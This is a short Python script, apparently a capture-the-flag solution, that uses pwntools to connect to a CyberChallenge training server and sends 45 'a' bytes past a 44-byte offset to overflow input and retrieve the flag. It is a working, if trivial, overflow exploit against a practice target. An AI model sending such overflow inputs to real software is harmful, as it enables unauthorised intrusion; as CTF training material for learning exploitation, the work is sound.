import pwn
from Crypto.Util.number import long_to_bytes, bytes_to_long

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9000

if(REMOTE):
    conn = pwn.remote(IP_ADDRESS, PORT)
else:
    conn = pwn.process(['python3', 'challenge.py'])


conn.recvuntil(b":")

offset = 44
conn.sendline(b"a" * (44+1))

conn.recvuntil(b"Use the flag to clean it.")

conn.recvline()
flag = conn.recvline(keepends=False).decode()

conn.close()
print(flag)